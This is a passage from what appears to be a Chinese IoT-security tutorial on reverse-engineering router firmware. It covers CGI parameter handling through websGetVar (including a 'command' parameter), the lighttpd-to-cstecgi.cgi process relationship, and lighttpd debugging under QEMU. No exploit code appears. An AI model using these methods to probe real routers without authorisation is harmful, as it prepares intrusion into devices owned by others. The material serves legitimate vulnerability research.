别看上面的伪代码一大坨，相信你从前面的分析中也能看出，这个函数是根据传入的参数获取值的，以sub_420F68为例有下面两种情况：
1. v2 = websGetVar(a1,"command","www.baidu.com");
2. v3 = websGetVar(a1,"num",(char *)"");

即，当websGetVar的第二个参数对应的值用户未设置时，默认使用websGetVar设置的第三个参数并return。
## ②、关于lighttpd与cgi之间的关系
那lighttpd与cgi之间是什么关系呢？如果你在文件系统中全局查找字符串cstecgi.cgi，那么不会得到任何结果：
![34.png](https://www.iotsec-zone.com/images/MdImg/fd212bd90e591dd9cbf5f61eed53335c.png)
想要找到这两个二进制文件之间的关系最简单的方式就是从进程下手，具体方法为：
1. 开启两个窗口，一个是路由器后台登录界面窗口，一个是qemu窗口
2. 在登录界面输入任意密码并登录，瞬间切换到qemu窗口中执行ps -wl | grep cgi（要求手速很快）
![35.png](https://www.iotsec-zone.com/images/MdImg/12eb329f35b8230920c8f5189eda01a6.png)
可以看到，cstecgi.cgi是lighttpd的子进程。还要注意cstecgi.cgi是正常的二进制文件，但我们不能直接的运行，否则会直接段错误：
![36.png](https://www.iotsec-zone.com/images/MdImg/04641bbbd45185ff5c2fef2a131c998e.png)
至于崩溃的原因请你继续往下看文章就知道了。
![37.png](https://www.iotsec-zone.com/images/MdImg/7581421f2daae5e94c2337d36c016ad2.png)

## ③、关于lighttpd的一些技巧
1. 对于该型号（或该品牌的路由器）在lighttpd.conf文件中有如下的debug日志调试开关：
![38.png](https://www.iotsec-zone.com/images/MdImg/047a43b153d61cdf5509b1a3d4e982d0.png)
2. 执行lighttpd -f [config_path]后lighttpd默认后台运行，如果不想后台运行则可以在启动时执行lighttpd -D -f [config_path]：
![39.png](https://www.iotsec-zone.com/images/MdImg/72a4d80733889cb2df5bf7fc8af8cbe6.png)
